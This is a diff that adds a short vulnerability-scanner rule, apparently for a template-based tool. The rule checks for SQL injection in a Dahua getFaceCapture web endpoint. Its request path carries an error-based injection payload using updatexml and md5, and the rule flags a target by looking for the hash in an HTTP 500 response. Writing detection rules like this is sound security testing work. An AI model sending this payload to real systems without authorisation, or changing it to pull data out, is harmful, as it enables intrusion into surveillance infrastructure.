@@ -1,0 +1,9 @@
+name: dahua-zhyq-getfacecapture-sqli
+rules:
+  - method: GET
+    path: "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123123)),0x7e),1)--%22%7D/extend/%7B%7D"
+    Content-Type: application/x-www-form-urlencoded
+    expression: |
+      response.status == 500 && response.body.bcontains(b'4297f44b13955235245b2497399d7a9')
+detail:
+  author: 666
